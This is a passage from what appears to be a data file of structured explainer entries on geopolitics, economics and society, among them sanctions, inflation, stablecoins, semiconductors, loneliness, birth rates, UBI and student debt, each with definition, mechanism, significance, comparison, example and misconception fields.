    "what": "a 1.4 million square mile body of water bounded by China, Vietnam, Philippines, Malaysia, Brunei, Indonesia, and Taiwan. China claims most of it via the 'nine-dash line', overlapping with claims of multiple ASEAN nations. The 2016 Hague tribunal ruled against China's claims; China rejected the ruling",
    "how": "China has built and militarized artificial islands on reefs, established administrative structures, and deployed coast guard, militia, and naval forces. Other claimants maintain occupied features. The US and allies conduct freedom-of-navigation operations to challenge excessive Chinese claims. Multiple bilateral and multilateral diplomatic processes continue",
    "why": "the South China Sea carries roughly $3 trillion in annual trade. It contains valuable fisheries and potential oil and gas reserves. It is also a strategic waterway whose control affects security balance in the Indo-Pacific. The US-Philippines mutual defense treaty has been clarified to include South China Sea incidents",
    "vs": "compared with other maritime disputes (Aegean, Arctic), the South China Sea features an explicit international tribunal ruling that one party rejects -- testing the strength of UNCLOS. Compared with Taiwan, the SCS involves multiple claimants and a more dispersed set of contested features",
    "ex": "the Second Thomas Shoal standoff (2023+): the Philippines maintains a grounded ship (BRP Sierra Madre) as a sovereignty marker; China's coast guard repeatedly blocks resupply, including with water cannons. The US Navy conducts freedom-of-navigation operations near contested features approximately monthly",
    "mis": "people think the dispute is just about fish or oil; the strategic dimension -- control of trade routes, ability to project force -- is at least as important. Another myth is that the issue is bilateral US-China; ASEAN nations have direct stakes and varying positions, complicating any blanket diplomatic approach",
}
T["sanctions as a foreign policy tool"] = {
    "what": "economic restrictions imposed by one country (or group) on another to influence behavior. Tools include trade embargoes, financial sanctions (cutting off banks), targeted asset freezes on individuals (SDN list), export controls (semiconductors, dual-use tech), and secondary sanctions on third-party violators",
    "how": "the US Treasury's OFAC administers many sanctions. Financial sanctions exploit the dollar's role in global trade -- non-US banks comply to avoid losing access. The EU, UK, and others maintain coordinated sanctions packages. Implementation includes designations, licensing exceptions, and enforcement actions",
    "why": "sanctions are a non-military lever in international disputes -- against Russia (post-2022), Iran (nuclear program), North Korea (weapons programs), Venezuela, Syria, and various individuals. Effectiveness varies: Iran's economy contracted significantly; Russia's adapted more than expected; North Korea continues programs despite extreme sanctions",
    "vs": "compared with military force, sanctions have lower direct casualties but humanitarian effects on civilian populations. Compared with diplomatic isolation alone, sanctions impose tangible costs. Compared with positive incentives (sanctions relief in negotiations), sanctions are coercive -- and once in place, often hard to lift politically",
    "ex": "Russia post-2022: SWIFT removal of major banks, freezing $300B+ of central bank reserves, oil price cap, semiconductor export controls. Russia rerouted trade through China, India, Turkey, UAE; the ruble stabilized after initial collapse; defense industry adapted. Effects are real but slower and more partial than initial expectations",
    "mis": "people think sanctions reliably change behavior; effectiveness depends on multilateral support, target's economic resilience, and political will. Another myth is that targeted sanctions avoid civilian harm -- broad financial sanctions affect daily life even when designed against specific individuals",
}
T["global migration patterns"] = {
    "what": "the movement of people across borders in response to conflict, economic opportunity, climate change, and family. Approximately 280 million international migrants live outside their country of birth (~3.6% of world population). Major flows include economic migration to richer countries and refugee flows from conflict zones",
    "how": "voluntary economic migration responds to wage differentials, employment availability, and visa policies. Refugee flows respond to violence and persecution; UNHCR registers ~30 million refugees globally. Climate-driven migration is rising (Pacific island nations, Sahel, Bangladesh) but often happens internally within countries before crossing borders",
    "why": "migration is reshaping demographics, economies, and politics in both sending and receiving countries. Receiving countries gain workers and innovation; sending countries experience brain drain offset by remittances ($800B+ globally in 2023). Politics around migration has become a defining issue in many democracies -- Brexit, US elections, EU politics",
    "vs": "compared with internal migration (often larger in volume), international migration crosses sovereign boundaries with associated legal and political frictions. Compared with refugees (legally protected), economic migrants have weaker legal status. Compared with historical waves, modern migration moves more rapidly via aviation and digital communication",
    "ex": "migration through the Mediterranean to Europe (over 200K crossings most years 2015-2024), via the US-Mexico border (2-3M apprehensions annually 2022-2024), and the Darien Gap (over 500K crossings in 2023). Regular labor migration from Philippines and India to Gulf states; intra-EU labor mobility; climate-driven internal displacement in Pakistan and elsewhere",
    "mis": "people overestimate migration scale; migrants are 3.6% of world population, not the majority shifts often imagined. Another myth is that migration only flows from poor to rich countries -- South-South migration exceeds South-North. Most migration is regional, not transcontinental",
}

# === CURRENT_EVENTS: economy ===
T["inflation drivers in the 2020s"] = {
    "what": "the combination of factors that drove sustained higher inflation across major economies from 2021 through 2024. US CPI peaked at 9.1% in mid-2022 (highest since 1981) before settling around 2.5-3% by 2025. Drivers included supply shocks, fiscal stimulus, monetary expansion, energy disruption, and labor market shifts",
    "how": "COVID-era supply chain disruption, semiconductor shortages, and shipping bottlenecks raised goods prices. Massive fiscal stimulus combined with central-bank QE expanded demand. The Russia-Ukraine war spiked food and energy prices in 2022. Tight labor markets pushed wages higher; service-sector inflation persisted longer than goods inflation",
    "why": "the inflation episode reshaped politics globally (incumbent losses in many democracies), forced rapid central bank rate hikes (the Fed raised 5.25%+ in 18 months), strained household budgets, and tested monetary policy frameworks. It also revived debates about supply-side resilience, fiscal policy limits, and central bank independence",
    "vs": "compared with the 1970s stagflation (driven by oil shocks and entrenched expectations), 2020s inflation was more transitory in its primary causes but persistent in services and shelter. Compared with the post-2008 environment of low inflation, the 2020s episode reaffirmed that fiscal-monetary expansion combined with supply shocks can create sustained inflation",
    "ex": "the Fed raised the federal funds rate from 0-0.25% in early 2022 to 5.25-5.50% by mid-2023 -- the fastest tightening cycle in 40 years. Mortgage rates rose from ~3% to ~7%, freezing the housing market. By 2024-2025, inflation cooled and the Fed began modest cuts as growth slowed but recession was avoided",
    "mis": "people blame inflation on a single cause (whether stimulus, corporate greed, or supply chains); academic consensus identifies multiple interacting drivers. Another myth is that price levels return to pre-pandemic levels when inflation slows -- inflation cooling means slower price increases, not price reversals",
}
T["central bank interest rate policy"] = {
    "what": "central banks like the Federal Reserve, ECB, and Bank of England set short-term interest rates to manage inflation and employment. Rate decisions cascade through the economy: borrowing costs, asset prices, exchange rates, and inflation expectations. The Fed targets 2% inflation and maximum employment",
    "how": "central banks set policy rates (the federal funds rate in the US) by managing reserves in the banking system. Higher rates reduce borrowing and investment, cooling demand and inflation. Lower rates stimulate. Forward guidance about future rates shapes expectations now. Quantitative easing buys bonds to add stimulus when rates are at zero",
    "why": "monetary policy is one of the most powerful economic tools -- it influences trillions of dollars in lending, mortgages, business investment, and currency values. The Fed's actions in 2022-2024 (rapid tightening) shaped the global economy, sparked banking stress (SVB, Credit Suisse 2023), and constrained inflation",
    "vs": "compared with fiscal policy (taxing and spending by government), monetary policy is faster to deploy and less politically constrained. Compared with currency interventions, rate policy works through interest rate transmission. Different central banks weigh inflation vs employment differently -- the ECB has a strict inflation mandate, the Fed has a dual mandate",
    "ex": "the Fed's 2022 tightening cycle: 0% in January, 4.5% by December, 5.5% by mid-2023. Mortgage rates spiked from 3% to 7%; tech stocks dropped 30%+; bond prices fell 15%+; the dollar strengthened 10%+. Inflation declined from 9% to ~3%, achieving the policy goal at meaningful economic cost",
    "mis": "people think the Fed sets all interest rates; it sets the policy rate, but market rates (mortgages, corporate bonds) reflect expectations of future Fed action and risk premiums. Another myth is that low rates always help -- prolonged near-zero rates may inflate asset prices and distort risk-taking",
}
T["quantitative easing and tightening"] = {
    "what": "QE is a central bank's purchase of long-term securities (government bonds, MBS) to inject liquidity and lower long-term rates when short-term rates hit zero. QT is the reverse -- letting securities mature off the balance sheet or selling them to drain liquidity. Both are unconventional monetary policy tools that became mainstream after 2008",
    "how": "in QE, the central bank credits banks' reserve accounts in exchange for bonds. The bond purchases push prices up and yields down across the term structure. Banks have more reserves to lend, financial conditions ease. In QT, the bank lets bonds mature without replacement (passive QT) or sells them (active), shrinking the balance sheet over time",
    "why": "QE was deployed at unprecedented scale: Fed balance sheet grew from $0.9T (2008) to $4.5T (2014), then to $9T (peak 2022). It supported recovery from the 2008 crisis and the COVID shock. Side effects include asset price inflation, distorted risk-taking, and political controversy over wealth effects",
    "vs": "compared with conventional rate policy, QE works on long-term rates and asset prices when short rates are at zero. Compared with fiscal stimulus (direct spending), QE works through financial channels and is less politically transparent. Compared with currency intervention, QE acts on rates and asset prices, with currency effects as a side effect",
    "ex": "the Fed's COVID-era QE: $4.7T balance sheet expansion in 2020-2022. Mortgage purchases of MBS pushed mortgage rates to historic lows (~2.7% in late 2020), supporting housing. Now in QT mode, the Fed has let ~$1.5T mature off the balance sheet, with broader effects on financial conditions and bank reserves",
    "mis": "people equate QE with money printing causing immediate inflation; QE creates bank reserves but most reserves stayed at the Fed earning interest, not flowing into broad money. Another myth is that QT is automatic; the Fed can pause or reverse it based on financial conditions",
}
T["cryptocurrency regulation"] = {
    "what": "the patchwork of laws, agency actions, and policy debates around cryptocurrencies, stablecoins, exchanges, and DeFi. Regulators address consumer protection, market integrity, financial stability, money laundering, and tax compliance. The legal environment varies dramatically by jurisdiction",
    "how": "in the US, multiple agencies claim jurisdiction (SEC for securities, CFTC for commodities, FinCEN for AML, IRS for tax). Major events include FTX collapse (2022) prompting fraud charges and renewed regulatory pressure, SEC vs Coinbase, the approval of spot Bitcoin and Ethereum ETFs (2024), and MiCA in the EU establishing a comprehensive crypto framework",
    "why": "regulation determines whether crypto becomes mainstream finance or remains marginal. Bitcoin ETFs unlocked institutional flows; stricter exchange rules raise compliance costs; CBDC research could leapfrog or compete with private crypto. The 2022 FTX collapse and SBF conviction accelerated calls for clearer rules globally",
    "vs": "the US enforces case-by-case; the EU's MiCA establishes comprehensive standards; Singapore and UAE actively court crypto firms; China bans cryptocurrencies but pushes its CBDC. Different approaches will compete to set global norms over the next decade",
    "ex": "spot Bitcoin ETFs approved by SEC in January 2024 ($60B+ AUM by mid-2025) brought institutional capital into crypto via traditional brokerages. Coinbase's lawsuit against the SEC over registration requirements continues. EU MiCA implementation phases through 2024-2026 establishing licensing for crypto-asset service providers",
    "mis": "people think crypto is unregulated; it is regulated, but the rules are contested and inconsistent across jurisdictions. Another myth is that ETF approval validates crypto fundamentals; ETF approval addresses market structure for spot exposure, not the underlying utility of crypto assets",
}
T["stablecoin mechanics"] = {
    "what": "cryptocurrencies designed to maintain a stable value, typically pegged to fiat currencies (USD, EUR). Major stablecoins include USDT (Tether), USDC (Circle), and DAI. They serve as the dollar layer for crypto markets, with combined market cap exceeding $200 billion in 2025",
    "how": "fiat-backed stablecoins (USDT, USDC) hold reserves of cash, T-bills, and similar assets that back the tokens 1:1. Crypto-backed stablecoins (DAI) are over-collateralized by other crypto. Algorithmic stablecoins (collapsed Terra UST in 2022) tried to maintain peg through arbitrage incentives -- often unstable in stress",
    "why": "stablecoins enable crypto trading without bank intermediation, support remittances at fraction of traditional cost, and are increasingly used in dollarized economies (Argentina, Nigeria, Venezuela) as digital dollar alternatives. Their growth has prompted central bank attention and CBDC consideration",
    "vs": "compared with bank deposits, stablecoins offer 24/7 settlement and global reach but lack FDIC insurance. Compared with CBDCs, stablecoins are private-issued but operationally similar for end users. Compared with Bitcoin, stablecoins prioritize stability over volatility-driven returns",
    "ex": "USDC issued by Circle: each token backed by short-term US Treasuries and cash held with regulated custodians. Monthly attestations by Big Four firms; transparent reserves. After SVB's collapse briefly broke USDC's peg in March 2023 (Circle held some funds there), the market quickly recovered when Circle confirmed reserves",
    "mis": "people assume all stablecoins are equally safe; reserve quality, regulatory status, and operational risk vary dramatically. Tether (USDT) has historically been less transparent than USDC. Another myth is that stablecoins eliminate dollar exposure -- they are dollar exposure in tokenized form",
}
T["CBDCs (central bank digital currencies)"] = {
    "what": "digital forms of central bank money issued and backed by national authorities. CBDCs differ from cryptocurrencies (decentralized) and from commercial bank deposits (private liability). Over 100 countries are researching or piloting CBDCs; China leads with its e-CNY in extensive use",
    "how": "CBDCs come in two main flavors: wholesale (used by banks for interbank settlement) and retail (held by households and businesses). Designs vary by intermediation (direct vs through banks), privacy (anonymous vs identified), and offline capability. The Bahamas Sand Dollar, Nigeria eNaira, and Jamaica JAM-DEX are early retail launches",
    "why": "CBDCs could modernize payment systems, support financial inclusion, enable new monetary policy tools, and respond to declining cash use. They also raise risks: bank disintermediation, surveillance concerns, and operational complexity. Geopolitical competition matters -- a global CBDC ecosystem could reshape dollar dominance",
    "vs": "compared with stablecoins (private), CBDCs are sovereign liabilities. Compared with bank deposits, CBDCs are direct claims on the central bank with no credit risk. Compared with cash, CBDCs enable digital convenience but reduce anonymity. Each design choice creates different tradeoffs",
    "ex": "China's e-CNY: piloted since 2019, deployed across major cities, used at the 2022 Beijing Olympics, integrated with Alipay and WeChat Pay. Tens of billions of dollars in transactions cumulatively. Use is incentivized but voluntary. The ECB is in the design phase for a digital euro, with potential launch in late 2020s",
    "mis": "people fear CBDCs as inevitable government surveillance tools; designs vary in privacy. Another myth is that CBDCs replace cash automatically; cash continues alongside, and several jurisdictions (US, UK) have not committed to retail CBDCs",
}
T["the rise of remote work"] = {
    "what": "the shift to working outside traditional offices, accelerated by COVID-19 and partially sustained afterward. By 2024, ~30% of US work-days are remote (up from ~5% pre-pandemic), with significant variation by industry, role, and geography. The shift has reshaped real estate, cities, and labor markets",
    "how": "enabling factors include broadband, video conferencing (Zoom, Teams), cloud-based collaboration tools, and managers' adaptation to outcome-based evaluation. Hybrid models (2-3 days in office) have stabilized as the most common pattern, though full-remote and full-in-office both persist",
    "why": "remote work transformed urban economies (downtowns lost office demand and accompanying retail/restaurant), residential real estate (work-from-anywhere flexibility shifted housing demand to suburbs and smaller cities), labor markets (geographic competition for talent), and gender equity (better fit for caregivers but with mixed advancement effects)",
    "vs": "compared with pre-COVID, remote work is far more prevalent in knowledge work and rare in service/manufacturing. Compared with full remote, hybrid maintains some collocated benefits (mentorship, culture) while preserving flexibility. Productivity research shows mixed results -- modestly higher individual productivity but uncertain effects on collaboration and innovation",
    "ex": "tech companies illustrate the spectrum: GitLab and Automattic are fully remote; Apple and Google require ~3 days in office; many startups are remote-first by default. Commercial real estate values dropped 20-40% in major US downtowns; office vacancies hit 20%+ in San Francisco. Residential demand shifted to Sun Belt cities like Austin, Tampa, Phoenix",
    "mis": "people think remote work is going away; survey data and corporate behavior show hybrid patterns are stabilizing rather than reversing. Another myth is that remote work is universally less productive -- evidence is mixed and varies by task, team, and management practice",
}
T["the gig economy"] = {
    "what": "labor markets organized around short-term contracts and independent contractor work rather than long-term employment, often mediated by digital platforms (Uber, DoorDash, Upwork, TaskRabbit). The gig economy includes ride-share, delivery, freelance creative work, and online platform-based services",
    "how": "platforms match workers to tasks via apps, taking a percentage of earnings. Workers are typically classified as independent contractors -- they control their schedules but lack employment protections (minimum wage, overtime, benefits, unemployment insurance). Algorithmic management directs work assignment, pricing, and ratings",
    "why": "the gig economy provides flexibility for workers and capacity for platforms but raises concerns about wages, benefits, and worker power. Estimates of US gig workers range 5-15% depending on definition. Disputes over worker classification (Prop 22 in California, EU Platform Work Directive) shape the regulatory landscape",
    "vs": "compared with traditional employment, gig work offers flexibility but lacks safety nets, predictable income, and benefits. Compared with self-employment, gig workers depend on platforms that set rates, limiting bargaining power. Compared with freelance work pre-platforms, modern gig work is more standardized but more algorithmically controlled",
    "ex": "California Proposition 22 (2020) classified ride-share and delivery drivers as independent contractors with limited new benefits, after a $200M+ campaign. The EU Platform Work Directive (2024) creates a presumption of employment that platforms must rebut. Different jurisdictions are settling the classification differently",
    "mis": "people think gig work is mostly main-job income; survey data shows ~70% of gig workers use it as supplemental income. Another myth is that all gig platforms are similar; tech-skilled platforms (Upwork) and ride-share/delivery (Uber, DoorDash) have very different economics, regulation, and worker experiences",
}
T["supply chain reshoring"] = {
    "what": "the shift of manufacturing and sourcing from distant low-cost locations (especially China) back to the home country or to nearer trusted partners (nearshoring, friendshoring). Driven by COVID-era supply disruptions, US-China tensions, and major government incentives like the CHIPS Act and Inflation Reduction Act",
    "how": "reshoring takes multiple forms: building new domestic capacity (TSMC's Arizona fabs, Intel's Ohio plant), shifting orders to nearby countries (Mexico for US, Vietnam/India for various supply chains), and adding redundancy across geographies. Process automation makes reshoring more economically viable by reducing labor cost differences",
    "why": "supply chain disruptions in 2020-2022 (semiconductors, PPE, shipping) revealed concentration risk. US-China geopolitical tensions added strategic risk to commercial calculations. Government incentives ($52B CHIPS Act, IRA's manufacturing credits) accelerate the shift in semiconductors, batteries, EVs, and clean energy components",
    "vs": "compared with offshore manufacturing (lowest cost), reshoring trades cost for resilience, control, and political alignment. Compared with multi-shore (diverse global production), reshoring concentrates closer to home but may sacrifice scale. The economic rationale varies by industry, and many supply chains will continue to span multiple countries",
    "ex": "TSMC's Arizona fabs ($65B investment, ~5000 jobs), Intel's Ohio plant ($28B initial), Hyundai's Georgia EV plant, Apple's Vietnam expansion, and significant Mexican manufacturing growth (especially auto parts). Foreign direct investment in US manufacturing surged 2022-2024",
    "mis": "people think reshoring is rapid and complete; supply chains adjust over years and most production stays where labor and supplier ecosystems are mature. Another myth is that reshoring solves all risks -- domestic supply chains have their own choke points (water, power, labor) that can disrupt production",
}
T["the semiconductor industry"] = {
    "what": "the ~$600 billion industry that designs and manufactures the chips powering computers, smartphones, cars, AI systems, and almost everything electronic. The industry features extreme specialization: design (Nvidia, AMD, Apple), manufacturing (TSMC, Samsung), equipment (ASML), materials, and packaging",
    "how": "leading-edge chips are made by photolithography in EUV (extreme ultraviolet) machines from ASML, costing $200M+ each. TSMC's most advanced fabs cost $20B+. Designers like Nvidia tape out designs that TSMC manufactures. Specialized companies handle every step: photoresists, photomasks, wafer testing, advanced packaging",
    "why": "semiconductors enable the information economy. Geopolitical concentration -- TSMC produces ~90% of leading-edge logic chips in Taiwan -- creates major supply risks. The CHIPS Act (US, $52B), EU Chips Act (43 billion euros), and China's massive investment all aim to reduce dependency",
    "vs": "compared with mature semiconductor processes (28nm and older, abundant capacity), leading-edge (3nm, 2nm) is dominated by 2-3 manufacturers globally. Compared with software, hardware has long development cycles and massive capital requirements. The industry has had cyclical booms and busts; AI demand has driven the latest cycle",
    "ex": "Nvidia's data center revenue exceeded $30B/quarter by 2024 due to AI training demand, making Nvidia one of the world's most valuable companies. TSMC builds the chips Nvidia designs; both depend on ASML's EUV equipment and Japanese specialty chemicals. The supply chain is global, concentrated, and strategically critical",
    "mis": "people equate 'chips' with consumer products; most by volume are simple controllers in cars, appliances, and industrial machines. Another myth is that domestic capacity solves dependency quickly -- new fab construction takes 4-7 years and skilled-labor pipelines take longer to build",
}
T["rare earth element supply"] = {
    "what": "the 17 rare-earth elements (REEs) -- 15 lanthanides plus scandium and yttrium -- are essential for magnets, lasers, batteries, catalysts, and many high-tech applications. Despite the name, REEs are not actually rare in the Earth's crust, but they are dispersed and difficult to refine economically",
    "how": "REE-bearing ores are mined, then chemically processed to separate individual elements -- a complex chemistry of solvent extraction. Most refining happens in China (~85% of global capacity), even when mining occurs elsewhere. The supply chain is politically and environmentally fraught; refining produces toxic and radioactive waste",
    "why": "REEs are critical for permanent magnets in EV motors and wind turbines, military systems (missile guidance, jet engines), and advanced electronics. Concentration of refining in China creates a strategic chokepoint. Diversifying supply has been a US, EU, and Japanese policy priority for over a decade with limited progress",
    "vs": "compared with widely-traded commodities (oil, copper), rare earths have illiquid markets and political pricing risk. Compared with substitutes -- which rarely fully replace REEs in advanced applications -- the technological dependency is meaningful. Recycling end-of-life products is a growing source",
    "ex": "Mountain Pass mine in California is the only US REE mine; ore is currently shipped to China for refining. MP Materials is building US refining capacity, supported by DoD funding. Lynas (Australian, refining in Malaysia and US) is the leading non-Chinese supplier. Building Western refining at scale takes years",
    "mis": "people think rare earths are scarce; they are abundant but expensive to produce cleanly. Another myth is that supply could be cut off cleanly; partial export restrictions (China imposed some on gallium and germanium in 2023) cause price spikes but not full cutoffs",
}
T["the housing affordability crisis"] = {
    "what": "the widening gap between housing costs and incomes in many countries, particularly in major metros. US median home price-to-income ratio reached over 6x in 2022 (vs ~3-4x historically); rental burdens (>30% of income) affect about half of renters. Causes include supply constraints, zoning, demographic shifts, and interest rates",
    "how": "supply has lagged household formation due to restrictive zoning (single-family-only districts), permit delays, construction labor shortages, and high construction costs. Demand outpaces supply in growing metros, pushing prices and rents up. Investor-owned homes and short-term rentals (Airbnb) take inventory off long-term markets in some areas",
    "why": "housing affordability shapes economic mobility, demographics (delayed family formation), wealth inequality (renters vs owners), and political polarization. Voters in many democracies cite housing as a top concern. Solutions involve zoning reform, construction subsidies, and various direct interventions, all politically contentious",
    "vs": "compared with the post-2008 era of cheap housing in many areas, the post-COVID housing market has been characterized by supply constraints and high rates simultaneously. Compared with the 2008 crisis (mortgage-driven), the current crisis is about supply and price levels rather than credit",
    "ex": "California's recent reforms: SB 9 (allows duplexes statewide on single-family lots), SB 35 (streamlined approvals for housing meeting density goals), ADU law expansions. Cities like Minneapolis ended single-family zoning in 2019. Texas builds more housing than any other US state, helping moderate price growth in major metros",
    "mis": "people blame the crisis on a single factor (foreign buyers, Airbnb, corporate landlords); aggregate effects from these are usually modest compared to fundamental supply-demand imbalance. Another myth is that building luxury housing doesn't help -- new supply at any price level reduces upward pressure on rents in surrounding affordable units",
}

# === CURRENT_EVENTS: society ===
T["social media's impact on mental health"] = {
    "what": "the body of research and policy debate on whether and how social media use affects mental health, particularly among adolescents. Concerns include depression, anxiety, body image, sleep disruption, and attention. Research is mixed and methodologically challenging, but evidence has grown for negative effects in some populations",
    "how": "proposed mechanisms include social comparison (curated highlights), displacement of in-person interaction and sleep, exposure to harmful content (eating disorder content, cyberbullying), and algorithmically amplified emotional engagement. Different platforms (Instagram, TikTok, Facebook), genders, and ages show different effect patterns",
    "why": "policy responses are accelerating: state laws restricting under-13 social media accounts, school phone bans, federal proposals on algorithmic transparency. The 2023 US Surgeon General's advisory called for protective steps. Jonathan Haidt's 2024 book 'The Anxious Generation' brought sustained attention to teen mental health trends and social media's role",
    "vs": "compared with previous moral panics (TV, video games), social media research shows stronger associations with adolescent mental health, especially for heavy users. Compared with offline social interaction, social media use can substitute for face-to-face contact in ways that worsen well-being",
    "ex": "Instagram's internal research (leaked by Frances Haugen in 2021) showed the platform worsened body image for one in three teen girls. Several US states, plus Australia (limiting under-16 accounts in 2025), are restricting youth platform access. Schools are increasingly banning phones during school hours",
    "mis": "people overstate causal certainty -- correlation between social media use and mental health is real but causation depends on which use, which population, and what alternative activities. Another myth is that social media is uniformly harmful; for some marginalized teens, online community is a positive resource",
}
T["the loneliness epidemic"] = {
    "what": "the documented rise in self-reported loneliness and social isolation in many developed countries over recent decades. The 2023 US Surgeon General's advisory called loneliness an epidemic with health effects comparable to smoking 15 cigarettes a day, raising risks of cardiovascular disease, dementia, and premature death",
    "how": "drivers include declining religious attendance, civic participation, marriage rates, and family co-residence; rising work intensity; geographic mobility; and shift to digital interaction. Younger adults report higher loneliness than previous generations did at the same age, despite (or partly because of) constant connectivity",
    "why": "loneliness has measurable health consequences and economic costs (productivity, healthcare). Policy responses include UK's Loneliness Strategy with a Minister for Loneliness (2018), Japan's similar position, and various community-building investments. Robert Putnam's 'Bowling Alone' (2000) framed many of the long-term trends now intensifying",
    "vs": "compared with isolation (objective lack of connection), loneliness is the subjective feeling of not having desired connection. Compared with depression, loneliness is distinct but related -- they correlate but aren't identical. Single-living and unmarried status correlate with but don't determine loneliness",
    "ex": "the UK's Campaign to End Loneliness, NHS social prescribing programs that connect lonely patients to community activities, US college 'flourishing' initiatives, and Cigna's annual loneliness studies. Workplaces are adding belonging-focused programs after pandemic-era findings on remote isolation",
    "mis": "people equate loneliness with simply being alone; many enjoy solitude. Loneliness is the gap between desired and actual connection. Another myth is that the elderly are most affected -- young adults consistently report higher loneliness in recent surveys, partly attributable to digital habits and life transitions",
}
T["declining birth rates in developed nations"] = {
    "what": "the trend of total fertility rates falling well below replacement (~2.1 births per woman) across much of the developed world. South Korea reached 0.72 in 2023, the lowest ever recorded. Japan, Italy, Spain, China, and most of Europe and East Asia are at or below 1.5",
    "how": "drivers include delayed marriage and childbearing (career and education), high cost of housing and childcare, urbanization, women's expanded opportunities, and cultural shifts. Once fertility falls below ~1.5, demographers see a 'low-fertility trap' as social norms and infrastructure adjust to small families, making rebound difficult",
    "why": "below-replacement fertility produces aging populations, shrinking labor forces, pension and healthcare strain, and eventually population decline. Japan and South Korea face shrinking working-age populations now; China's population began declining in 2022. Implications for economic growth, immigration policy, and intergenerational fairness are profound",
    "vs": "compared with developing-world fertility (still above replacement in much of Africa), developed-world fertility has trended down for decades. Compared with policy attempts (cash bonuses, parental leave, subsidized childcare), results are mixed -- France maintains relatively higher fertility (~1.8) but Korea's massive incentives have not reversed decline",
    "ex": "South Korea spent over $200B on family policy over 16 years; fertility kept falling. Hungary's pro-natal policies (loans, tax breaks for mothers of 4+) raised fertility modestly. Singapore offers cash incentives, parental leave, and matchmaking services with limited effect. Cultural and economic conditions appear more determinative than narrow policy",
    "mis": "people think immigration solves the demographic challenge alone; immigration helps the working-age population but doesn't address total population decline at very low fertility. Another myth is that low fertility is automatically bad environmentally -- positive for ecological footprint per generation but disrupts economic and pension systems built for growth",
}
T["aging population challenges"] = {
    "what": "the demographic shift toward higher proportions of older adults, driven by longer lifespans and lower fertility. By 2050, 22% of the world's population will be over 60 (up from 12% in 2020). Japan, Korea, Germany, Italy lead; the US and China face significant transitions",
    "how": "as the working-age share falls, dependency ratios (workers to retirees) rise. Pension systems designed for many workers per retiree become strained. Healthcare costs rise as older populations require more care. Productivity per worker must rise faster, or living standards stagnate. Immigration helps but is politically constrained",
    "why": "aging affects fiscal sustainability (Social Security, Medicare in the US; pensions everywhere), labor markets (worker shortages), housing markets (downsizing), and political dynamics (older voters' priorities). Adapting requires policy responses across retirement age, immigration, technology, family support, and tax structures",
    "vs": "compared with countries with younger populations (much of Africa, South Asia), aging societies face different growth dynamics -- mature, efficiency-focused, with skilled labor at premium. Compared with previous demographic transitions, the speed of aging in some Asian countries is unprecedented",
    "ex": "Japan: ~30% of population over 65, working-age population shrinking, robots and automation deployed in elder care, retirement age progressively raised. Germany faces similar pressures; both have boosted immigration significantly. South Korea's challenges are intensifying given the world's lowest fertility",
    "mis": "people frame aging as purely a problem; older adults contribute substantially through caregiving, volunteering, and continued work. Another myth is that technology fully substitutes for younger workers -- AI and robotics help in some jobs, but care work and many service jobs remain labor-intensive",
}
T["universal basic income proposals"] = {
    "what": "policy proposals to provide regular cash payments to all adults, unconditional on income or work status. UBI proposals vary widely in size (a small supplement to a livable income), funding (taxation, sovereign wealth, money creation), and replacement of existing programs",
    "how": "implementation models range from full UBI replacing other welfare ($1000/month for all adults) to negative income tax (phased payments based on income) to topping up existing benefits. Funding can come from value-added tax (Yang's Freedom Dividend), wealth tax, carbon dividend, or budget reallocation. Pilot programs in Stockton, Finland, Kenya, and elsewhere have tested smaller-scale versions",
    "why": "UBI is debated as a response to AI-driven job displacement, low-wage work, welfare administrative costs, and poverty alleviation. Proponents (Andrew Yang, Sam Altman, various tech leaders) cite efficiency and dignity; critics worry about cost, work incentives, and inflation. The debate intensified with COVID-era stimulus payments demonstrating cash-transfer feasibility",
    "vs": "compared with means-tested welfare, UBI eliminates administrative complexity and stigma but is more expensive per dollar of poverty relief. Compared with negative income tax, UBI gives the same to everyone (taxed back from higher earners). Compared with job guarantees, UBI is cash without work requirement",
    "ex": "Stockton, CA pilot (2019-2021): $500/month to 125 randomly selected residents. Results showed improved employment outcomes, mental health, and family stability with no evidence of work disincentive. Alaska's Permanent Fund Dividend has paid yearly oil-revenue dividends to residents since 1982 (~$1500/year in 2023)",
    "mis": "people think UBI would cause everyone to stop working; pilots and natural experiments suggest small effects on labor supply, often slight reductions concentrated in specific groups (parents of young children, students). Another myth is that UBI is a left-right binary issue; it has supporters and critics across the political spectrum",
}
T["the four-day workweek"] = {
    "what": "the proposal and pilot programs to compress full-time work into four days while maintaining pay -- typically 32 hours per week. Major trials in the UK, Iceland, Spain, and elsewhere have shown improved well-being, reduced burnout, and similar or improved productivity",
    "how": "implementations vary: 100-80-100 (full pay, reduced hours, maintained productivity), compressed schedules (40 hours in 4 days), or staggered (different days off across employees). Companies often eliminate unproductive meetings, ban distracting tools during focus time, and adopt asynchronous communication",
    "why": "the four-day week addresses burnout, work-life balance, gender equity (childcare distribution), and productivity in knowledge work. Iceland's 2015-2019 trial covering ~1% of the workforce showed positive results, leading to widespread shorter-hours adoption. UK and Spain trials in 2022-2023 had ~90% of participating companies continuing the policy",
    "vs": "compared with traditional 5-day weeks, the 4-day week trades 8 hours of work per week for personal time. Compared with remote/hybrid flexibility, the 4-day week structurally reduces total work hours rather than redistributing them. Best for output-focused knowledge work; harder for shift work, healthcare, and customer-service-intensive roles",
    "ex": "the UK's 2022 four-day-week pilot: 61 companies, 2900 workers, 6-month trial. 92% of companies continued the four-day week after the trial. Reported revenue grew 35% on average vs the same period prior year (with caveats on selection effects); employee turnover dropped, well-being improved, no significant productivity loss",
    "mis": "people think the four-day week is impossible without productivity loss; controlled trials repeatedly show maintained or improved productivity. Another myth is that all jobs can adopt it equally -- service and manufacturing jobs have different feasibility and may need different patterns (shift adjustments, hiring, automation)",
}
T["student debt"] = {
    "what": "the outstanding loans US students and former students owe for higher education. Total US student debt exceeds $1.7 trillion as of 2024, second only to mortgages among consumer debt categories. Average debt for bachelor's-degree borrowers is ~$30K; graduate and professional borrowers often owe much more",
    "how": "federal student loans dominate (~92% of outstanding balance), with various repayment plans (standard 10-year, income-driven, public service forgiveness). The Biden administration's broad cancellation plan was struck down by the Supreme Court in 2023, but income-driven repayment expansions and targeted forgiveness have continued. Private student loans lack federal protections",
    "why": "student debt affects life decisions (delayed home buying, marriage, family), economic mobility, and retirement preparedness. Default rates are highest among non-completers and those at low-quality institutions. Debate involves the rising cost of college, wage premiums for degrees, and policy responses (forgiveness, free college, accountability for institutions)",
    "vs": "compared with mortgages, student loans cannot generally be discharged in bankruptcy and lack collateral. Compared with credit card debt, federal student loans have lower rates and flexible repayment. Compared with degree-completion debt, non-completers carry debt without the income premium of the degree",
